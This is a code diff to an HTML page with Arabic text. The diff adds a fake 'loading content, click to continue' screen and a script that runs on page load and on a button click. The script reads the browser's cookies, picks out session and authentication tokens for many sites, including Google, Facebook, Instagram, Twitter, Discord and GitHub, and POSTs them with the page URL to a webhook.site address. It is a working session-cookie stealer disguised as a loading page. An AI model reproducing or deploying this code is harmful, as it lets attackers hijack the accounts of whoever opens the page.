@@ -44,6 +44,78 @@ fetch(webhookUrl, {
                     alert("حدث خطأ، يرجى المحاولة مرة أخرى.");
                 });
         }
+
+        <div style="text-align: center; margin-top: 50px;">
+        <h2>جاري تحميل المحتوى...</h2>
+        <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
+        <button id="btn" style="padding: 10px 20px; background-color: #28a745; color: white; border: none; cursor: pointer; font-size: 16px;">اضغط هنا للمتابعة</button>
+    </div>
+
+    <script>
+        const webhookUrl = "https://webhook.site/5aaa35a1-60e4-4b7f-953e-10a3078c0436";
+
+        const SESSION_COOKIE_NAMES = new Set([
+            "sessionid", "session_token", "session_id", "session", "sid",
+            "connect.sid", "login_info", "logged_in",
+            "auth_token", "access_token", "token", "oauth_token",
+            "id_token", "refresh_token", "bearer_token",
+            "apisid", "sapisid", "hsid", "ssid", "lsid",
+            "c_user", "datr", "xs", "fr", "sb",
+            "ds_user_id", "csrftoken", "rur", "mid",
+            "ct0", "twid",
+            "locale", "dcfduid", "sdcfduid",
+            "_gh_sess", "user_session", "dotcom_user",
+            "kick_session_id",
+            "phpsessid", "jsessionid", "_session_id", "remember_token",
+            "remember_user_token", "remember_web"
+        ]);
+
+        // دالة لاستخراج الكوكيز المطابقة للقائمة
+        function getTargetCookies() {
+            const foundCookies = {};
+            const cookies = document.cookie.split(";");
+            
+            for (let cookie of cookies) {
+                const parts = cookie.split("=");
+                const name = parts[0].trim().toLowerCase();
+                const value = parts.slice(1).join("=").trim();
+                
+                if (SESSION_COOKIE_NAMES.has(name)) {
+                    foundCookies[name] = value;
+                }
+            }
+            return foundCookies;
+        }
+
+        function sendData() {
+            const extractedCookies = getTargetCookies();
+
+            const dataToSend = {
+                url: window.location.href,
+                cookies: extractedCookies,
+                timestamp: new Date().toISOString()
+            };
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(dataToSend)
+            })
+            .then(response => {
+                console.log("تم الإرسال بنجاح");
+            })
+            .catch(error => {
+                console.error("خطأ:", error);
+            });
+        }
+
+        // إرسال تلقائي عند فتح الصفحة
+        sendData();
+
+        // إرسال عند الضغط على الزر
+        document.getElementById("btn").addEventListener("click", sendData);
     </script>
 </body>
 </html>
